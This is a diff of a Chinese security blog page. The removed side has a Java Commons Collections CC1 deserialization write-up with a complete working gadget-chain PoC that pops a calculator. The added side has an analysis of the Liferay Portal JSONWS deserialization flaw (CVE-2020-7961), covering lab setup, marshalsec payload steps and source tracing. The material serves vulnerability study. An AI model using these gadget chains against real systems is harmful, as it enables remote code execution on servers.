@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java反序列化-cc1链, jokerscar&#39;blogs">
-    <meta name="description" content="Commons Collections简介Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开">
+    <meta name="keywords" content="Liferay Portal反序列化, jokerscar&#39;blogs">
+    <meta name="description" content="漏洞概述Liferay（又称Liferay Portal）是一个开源门户项目，该项目包含了一个完整的J2EE应用。该项目使用了Web、EJB以及JMS等技术，特别是其前台界面部分使用Struts 框架技术，基于XML的portlet配置文件">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java反序列化-cc1链 | jokerscar&#39;blogs</title>
+    <title>Liferay Portal反序列化 | jokerscar&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java反序列化-cc1链</h1>
+                    <h1 class="description center-align post-title">Liferay Portal反序列化</h1>
                 </div>
             </div>
         </div>
@@ -408,12 +408,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                <span class="chip bg-color">反序列化利用链</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">漏洞分析</span>
                             </a>
                         
                             <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                                 <span class="chip bg-color">Java代码审计</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">反序列化漏洞</span>
                             </a>
                         
                     </div>
@@ -428,10 +432,6 @@
                                 漏洞分析
                             </a>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="post-category">
-                                反序列化利用链
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -441,7 +441,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-12
+                    2021-07-02
                 </div>
                 
 
@@ -462,114 +462,110 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h2><p>Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
-<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>cc链中常见的利用路线有两种，分别是TransformedMap链和LazyMap链，触发的方式基本相同，这里我们重点分析TransformedMap链。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDA.tmp.jpg" alt="img"></p>
-<p>但不管TransformedMap利用链还是LazyMap利用链其实核心都是在调用实现了transformer接口的关键函数所构成的，在构造transformer反射利用链前可以关注一下transformer接口在源码注释中解释作用是将输入的对象转换成输出的对象。而构造利用链就需要用到实现了Transformer接口并重写了该接口中的transform函数，分别是ConstantTransformer，invokerTransformer，ChainedTransformer。</p>
-<h3 id="invokerTransformer"><a href="#invokerTransformer" class="headerlink" title="invokerTransformer"></a>invokerTransformer</h3><p>首先从invokerTransformer开始分析，以下是invokerTransformer的构造函数写transform()函数的主要内容。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDB.tmp.jpg" alt="img"></p>
-<p>transform函数的功能简单描述一下就是通过java的反射机制调用input对象中的指定函数，函数名和参数类型分别是invokerTransformer对象实例化时传入的iMethodName和iParamTypes，利用传入的函数名和参数可控这点我们可以构造一个恶意的transform链来达成任意代码执行的效果。</p>
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>接着再来看看ConstantTransformer类</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDC.tmp.jpg" alt="img"></p>
-<p>从上面ConstantTransformer类的构造函数可以看到，当ConstantTransformer的对象实例化时会将传入的对象赋值给成员属性iConstant，而这个属性在重写的transform函数被调用时返回。</p>
-<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>还是重点来关注ChainedTransformer类中的构造函数和重写的transform函数</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDD.tmp.jpg" alt="img"></p>
-<p>我们可以看到传入进ChainedTransformer的参数是transform类型的数组，然后在ChainedTransformer对象实例化时会将传入的这个数组赋值给成员变量iTransformers在调用transform()函数时会将iTransformers数组内的每个transform对象的transform()函数调用一遍。读起来有点绕口是吗，这个反射链执行的其实是((Runtime) Runtime.class.getMethod(“getRuntime”).invoke(“null”)).exec(“calc.exe”);</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDE.tmp.jpg" alt="img"></p>
-<p>运行如图所示的demo可以看到成功的弹出了计算器，</p>
-<p>现在利用链有了，下一步要做的就是去找反序列化漏洞的触发点。目前已知java反序列化漏洞利用的核心是可序列化对象重写readObject函数并定义了一些危险的操作（例如调用Runtime类的exec执行系统命令）。而从上述的demo1中可以发现我们还需要的是在TransformedMap中可以调用到ChainedTransformer的transform函数机会。接下来的重点就是找触发transform函数和重写readObject函数的方式。</p>
-<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>commons-collections组件中有两个实现了Serializable接口的类，分别是LazyMap和TransformedMap，也就是cc链中常用的两个类。</p>
-<p>TransformedMap类是Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
-<p>首先从TransformedMap源码入手</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDF.tmp.jpg" alt="img"></p>
-<p>​    可以看到在TransformedMap中有三个调用到transform的函数transfomKey()、transformValue()和checkSetValue()。这三个函数都是protected属性无法在外部直接被访问，但可以看到checkSetValue的注释中有下图中这样一段话，也就是说当TransformedMap的对象作为map被调用setvalue函数时触发的实际上是checkSetValue()。因此我们后面需要做的就是想办法调用到setvalue()函数。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE0.tmp.jpg" alt="img"></p>
-<p>另外在TransformedMap类中还有一个decorate()函数，decorate()函数会根据TransformedMap的构造函数中传入的参数返回一个TransformedMap对象。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE1.tmp.jpg" alt="img"></p>
-<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>触发transform函数的方式已经建立好了，下面需要做的是重写了readObject()函数调用到TransformedMap对象的setValue()函数，从知名反序列化工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"> <em><strong>*ysoserial*</strong></em></a>的源码中可以看到作者选择了AnnotationInvocationHandler这个类来重写readObject。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF1.tmp.jpg" alt="img"></p>
-<p>AnnotationInvocationHandler是jdk下sun.reflect.annotation包中的一个类它实现了Serializable接口重写readObject()，其中还存在一个map属性的成员变量，在构造利用链时需要做的就是在AnnotationInvocationHandler实例化时将前面构造好的TransformedMap赋值个这个memberValues。但值得注意的是java8u71之后的版本修改了readObject不能利用。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF2.tmp.jpg" alt="img"></p>
-<p>版本高一点的jdk在AnnotationInvocationHandler的readobject函数可读性很差且不能利用，观察jdk1.7版本中AnnotationInvocationHandler重写的readObject函数。</p>
-<p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {</p>
-<p>  var1.defaultReadObject();</p>
-<p>  AnnotationType var2 &#x3D; null;</p>
-<p>  try {</p>
-<p>​    var2 &#x3D; AnnotationType.getInstance(this.type);</p>
-<p>  } catch (IllegalArgumentException var9) {</p>
-<p>​    throw new InvalidObjectException(“Non-annotation type in annotation serial stream”);</p>
-<p>  }</p>
-<p>  Map var3 &#x3D; var2.memberTypes();</p>
-<p>  Iterator var4 &#x3D; this.memberValues.entrySet().iterator();</p>
-<p>  while(var4.hasNext()) {</p>
-<p>​    Entry var5 &#x3D; (Entry)var4.next();</p>
-<p>​    String var6 &#x3D; (String)var5.getKey();</p>
-<p>​    Class var7 &#x3D; (Class)var3.get(var6);</p>
-<p>​    if (var7 !&#x3D; null) {</p>
-<p>​      Object var8 &#x3D; var5.getValue();</p>
-<p>​      if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {</p>
-<p>​        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + “[“ + var8 + “]”)).setMember((Method)var2.members().get(var6)));</p>
-<p>​      }</p>
-<p>​    }</p>
-<p>  }</p>
+                <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Liferay（又称Liferay Portal）是一个开源门户项目，该项目包含了一个完整的J2EE应用。该项目使用了Web、EJB以及JMS等技术，特别是其前台界面部分使用Struts 框架技术，基于XML的portlet配置文件可以自由地动态扩展，使用了Web Services来支持一些远程信息的获取，使用 Apache Lucene实现全文检索功能。</p>
+<p>7.2.1 CE GA2 之前的 Liferay Portal 中不可信数据的反序列化允许远程攻击者通过 JSON Web 服务 (JSONWS) 执行任意代码。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><em><strong>环境搭建</strong></em></p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1">tomcat集成包</a>，在liferay-ce-portal-7.2.0-ga1\tomcat-9.0.17\bin路径下打开startup.bat，等待tomcat服务开启。</p>
+<p>访问<a href="http://127.0.0.1:8080能正常访问下图页面则说明搭建成功。">http://127.0.0.1:8080能正常访问下图页面则说明搭建成功。</a></p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBD8.tmp.jpg" alt="img"></p>
+<p>跟随网页提示完成初始化后进入以下页面，漏洞环境搭建完成</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBE9.tmp.jpg" alt="img"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造恶意代码</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEA.tmp.jpg" alt="img"></p>
+<p>将其编译为class文件后开启http服务</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEB.tmp.jpg" alt="img"></p>
+<p>使用Java反序列化利用工具<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>的c3p0模块生成payload</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEC.tmp.jpg" alt="img"></p>
+<p>将构造完成的payload放入请求数据包中</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBED.tmp.jpg" alt="img"></p>
+<p>可以看到成功执行弹出计算器的命令</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEE.tmp.jpg" alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从nvd官网对CVE-2020-7961的描述中发现反序列化的数据是经过了JSON web service的</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEF.tmp.jpg" alt="img"></p>
+<p>定位到WEB-INF&#x2F;web.xml中</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF0.tmp.jpg" alt="img"></p>
+<p>通过该映射规则的servlet找到其对应的类为com.liferay.portal.jsonwebservice.JSONWebServiceServlet</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF1.tmp.jpg" alt="img"></p>
+<p>跟进这个servlet类，其中的service方法中定义了查看json web服务的路径</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF2.tmp.jpg" alt="img"></p>
+<p>在web页面中输入路径<a target="_blank" rel="noopener" href="http://url/api/jsonws%E5%8F%AF%E6%9F%A5%E7%9C%8Bapi%E5%88%97%E8%A1%A8%E3%80%82">http://url/api/jsonws可查看api列表。</a></p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC02.tmp.jpg" alt="img"></p>
+<p>在这些接口有多个接口参数接收java.lang.object，比如update-column，意味着在此处传递的参数可以构造符合Java Beans的可利用恶意类</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC03.tmp.jpg" alt="img"></p>
+<p>liferay在7以前的版本使用flexjson处理、序列化json数据而在7以后使用jodd json处理、序列化json数据，这里主要分析liferay7之后的版本。</p>
+<p>通过查阅资料得知liferay中的com.liferay.portal.json.JSONSerializerImpl实现了jodd中的json序列化的接口JSONSerializer</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC04.tmp.jpg" alt="img"></p>
+<p>在com.liferay.portal.json.JSONDeserializerImpl中实现了了jodd中的反序列化接口JSONDeserializer</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC05.tmp.jpg" alt="img"></p>
+<p>通过漏洞发现者whitecode团队给出jodd.json.Parser的调用图，我们可以在JSONWebServiceServlet下断点后发送&#x2F;api&#x2F;jsonws&#x2F;invoke请求</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC06.tmp.jpg" alt="img"></p>
+<p>一直debug到JSONWebServiceSerlet的父类JSONservlet中发现调用execute处理json继续跟入此方法</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC07.tmp.jpg" alt="img"></p>
+<p>观察com.liferay.portal.struts.JSONAction的execute方法，首先调用rerouteExecte检测路径，调用checkAuthToken方法鉴权，接着调用getJSON再对json数据处理，跟进getJSON</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC08.tmp.jpg" alt="img"></p>
+<p>在没有上传异常通过后进入getJSONWebServiceAction</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC09.tmp.jpg" alt="img"></p>
+<p>在JSONWebServiceAction中继续更热返回的JSONWebServiceInvokerAction类的invoke方法</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC0A.tmp.jpg" alt="img"></p>
+<p>在invoke方法的第一行中发现这里反序列化了_command，__command参数是用来传入调用的api方法</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC0B.tmp.jpg" alt="img"></p>
+<p>继续往下调用了_parseStatement，__executeStatement</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1C.tmp.jpg" alt="img"></p>
+<p>跟入_executeStatement观察result的成分继续深入jsonWebServiceAction</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1D.tmp.jpg" alt="img"></p>
+<p>从下面代码发现getJSONWebServiceAction()最后返回的是一个JSONWebServiceActionImpl实例</p>
+<p>public JSONWebServiceAction getJSONWebServiceAction(</p>
+<p>HttpServletRequest httpServletRequest)</p>
+<p>throws NoSuchJSONWebServiceException {</p>
+<p>String path &#x3D; GetterUtil.getString(httpServletRequest.getPathInfo());</p>
+<p>String method &#x3D; GetterUtil.getString(httpServletRequest.getMethod());</p>
+<p>String parameterPath &#x3D; null;</p>
+<p>JSONRPCRequest jsonRPCRequest &#x3D; null;</p>
+<p>int parameterPathIndex &#x3D; _getParameterPathIndex(path);</p>
+<p>if (parameterPathIndex !&#x3D; -1) {</p>
+<p>parameterPath &#x3D; path.substring(parameterPathIndex);</p>
+<p>path &#x3D; path.substring(0, parameterPathIndex);</p>
 <p>}</p>
-<p>简单解释以下就是获取AnnotationInvocationHandler实例化的对象中的成员变量memberValues对其迭代。而下面这段代码正是我们需要用到的调用setValue()。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF3.tmp.jpg" alt="img"></p>
-<p>在源码中可以看到AnnotationInvocationHandler类的访问权限不是public，因此只能通过反射的方式获取到对象。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="利用链流程："><a href="#利用链流程：" class="headerlink" title="利用链流程："></a>利用链流程：</h3><p>通过Transformer[] transformers &#x3D; new Transformer[]{}构造恶意transformers数组—&gt;将Transformer数组传入transformerChain方便调用数组内的每一个transform函数—&gt;创建map，调用TransformedMap中的decorate将transformerChain传入并返回TransformedMap对象—&gt;通过反射实例化AnnotationInvocationHandler并将TransformedMap传个生成的对象调用readObject()触发checkSetValue()—&gt;序列化—&gt;反序列化触发漏洞</p>
-<h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><p>import java.io.*;</p>
-<p>import java.util.HashMap;</p>
-<p>import java.util.Map;</p>
-<p>import org.apache.commons.collections.Transformer;</p>
-<p>import org.apache.commons.collections.functors.ChainedTransformer;</p>
-<p>import org.apache.commons.collections.functors.ConstantTransformer;</p>
-<p>import org.apache.commons.collections.functors.InvokerTransformer;</p>
-<p>import java.lang.reflect.Constructor;</p>
-<p>import java.lang.annotation.Target;</p>
-<p>import org.apache.commons.collections.map.TransformedMap;</p>
-<p>public class test {</p>
-<p>  public static void main(String[] args) throws Exception{</p>
-<p>​    &#x2F;&#x2F;核心利用代码</p>
-<p>​    Transformer[] transformers &#x3D; new Transformer[]{</p>
-<p>​        new ConstantTransformer(Runtime.class),</p>
-<p>​        new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}),</p>
-<p>​        new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</p>
-<p>​        new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc.exe”})</p>
-<p>​    };</p>
-<p>​    &#x2F;&#x2F;将数组transformers传给ChainedTransformer，构造利用链</p>
-<p>​    Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</p>
-<p>​    &#x2F;&#x2F;触发漏洞</p>
-<p>​    Map map &#x3D; new HashMap();</p>
-<p>​    map.put(“value”, “test”);</p>
-<p>​    &#x2F;&#x2F;通过反射触发利用链</p>
-<p>​    Map transformedMap &#x3D; TransformedMap.decorate(map, null, transformerChain);</p>
-<p>​    Class cl &#x3D; Class.forName(“sun.reflect.annotation.AnnotationInvocationHandler”);</p>
-<p>​    &#x2F;&#x2F;获得AnnotationInvocationHandler的构造器</p>
-<p>​    Constructor ctor &#x3D; cl.getDeclaredConstructor(Class.class, Map.class);</p>
-<p>​    ctor.setAccessible(true);</p>
-<p>​    &#x2F;&#x2F;将transformedMap传给AnnotationInvocationHandler的构造</p>
-<p>​    Object instance&#x3D;ctor.newInstance(Target.class, transformedMap);</p>
-<p>​    &#x2F;&#x2F;序列化</p>
-<p>​    FileOutputStream fileOutputStream &#x3D; new FileOutputStream(“serialize.ser”);</p>
-<p>​    ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(fileOutputStream);</p>
-<p>​    objectOutputStream.writeObject(instance);</p>
-<p>​    objectOutputStream.close();</p>
-<p>​    &#x2F;&#x2F;反序列化</p>
-<p>​    FileInputStream fileInputStream &#x3D; new FileInputStream(“serialize.ser”);</p>
-<p>​    ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(fileInputStream);</p>
-<p>​    Object result &#x3D; objectInputStream.readObject();</p>
-<p>​    objectInputStream.close();</p>
-<p>  }</p>
+<p>else {</p>
+<p>if (method.equals(HttpMethods.POST) &amp;&amp;</p>
+<p>!PortalUtil.isMultipartRequest(httpServletRequest)) {</p>
+<p>jsonRPCRequest &#x3D; JSONRPCRequest.detectJSONRPCRequest(</p>
+<p>httpServletRequest);</p>
+<p>if (jsonRPCRequest !&#x3D; null) {</p>
+<p>path +&#x3D; StringPool.SLASH + jsonRPCRequest.getMethod();</p>
+<p>method &#x3D; null;</p>
 <p>}</p>
-<p>在jdk1.7版本下运行上述demo可观察到成功执行构造的恶意代码</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF4.tmp.jpg" alt="img"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/118387718">https://blog.csdn.net/qq_35733751/article/details/118387718</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1034/">https://paper.seebug.org/1034/</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/359194253">https://zhuanlan.zhihu.com/p/359194253</a></p>
-<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/97">https://security.tencent.com/index.php/blog/msg/97</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/14777166.html">https://www.cnblogs.com/yyhuni/p/14777166.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Maskhe/javasec/blob/master/3">https://github.com/Maskhe/javasec/blob/master/3</a>. apache commons-collections中的反序列化.md</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA">https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA</a></p>
+<p>}</p>
+<p>}</p>
+<p>JSONWebServiceActionParameters jsonWebServiceActionParameters &#x3D;</p>
+<p>new JSONWebServiceActionParameters();</p>
+<p>jsonWebServiceActionParameters.collectAll(</p>
+<p>httpServletRequest, parameterPath, jsonRPCRequest, null);</p>
+<p>if (jsonWebServiceActionParameters.getServiceContext() !&#x3D; null) {</p>
+<p>ServiceContextThreadLocal.pushServiceContext(</p>
+<p>jsonWebServiceActionParameters.getServiceContext());</p>
+<p>}</p>
+<p>JSONWebServiceActionConfig jsonWebServiceActionConfig &#x3D;</p>
+<p>_findJSONWebServiceAction(</p>
+<p>httpServletRequest, path, method,</p>
+<p>jsonWebServiceActionParameters);</p>
+<p>return new JSONWebServiceActionImpl(</p>
+<p>jsonWebServiceActionConfig, jsonWebServiceActionParameters,</p>
+<p>_jsonWebServiceNaming);</p>
+<p>}</p>
+<p>跟入JSONWebServiceActionImpl观察_prepareParameters方法，通过反射获取所有参数，for遍历拿到参数名并处理参数值，当参数值不为空时，会进行类型转换。</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1E.tmp.jpg" alt="img"></p>
+<p>继续往后跟进跟进参数调用_convertValueToParameterValue方法</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1F.tmp.jpg" alt="img"></p>
+<p>其中折叠的部分包含了将json反序列化传入的参数值，赋值给parameterValue的过程，并判断不是map实例并且是以{开头就反序列化JSONFactoryUtil.looseDeserialize(valueString, parameterType)，如果<strong>parameterType</strong>可控，那么就会造成反序列化漏洞</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC20.tmp.jpg" alt="img"></p>
+<p>上述的_jsonWebServiceActionParameters在其定义的过程中存入了一个JSONWebServiceActionParametersMap</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC21.tmp.jpg" alt="img"></p>
+<p>跟入JSONWebServiceActionParametersMap其中的putty方法在whitecode的文章中描述的很清晰，参数的类型取自key传进来的字符串，如果请求参数名称包含 ‘ <code>:</code>‘，传递进来的值会被构造为”:”前是key,”:”后是typename的hashmap。</p>
+<p><img src="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC22.tmp.jpg" alt="img"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="#toc-9">https://xz.aliyun.com/t/7499#toc-9</a></p>
+<p><a target="_blank" rel="noopener" href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html">https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1162/">https://paper.seebug.org/1162/</a></p>
 
                 
             </div>
@@ -596,7 +592,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/">http://example.com/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/</a>
+                    <a href="http://example.com/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -634,12 +630,16 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                    <span class="chip bg-color">反序列化利用链</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">漏洞分析</span>
                                 </a>
                             
                                 <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                                     <span class="chip bg-color">Java代码审计</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">反序列化漏洞</span>
                                 </a>
                             
                         </div>
@@ -691,13 +691,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/12/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/">
+                <a href="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="内存马学习(一)">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Java反序列化-cc1链">
                         
-                        <span class="card-title">内存马学习(一)</span>
+                        <span class="card-title">Java反序列化-cc1链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -708,18 +708,18 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
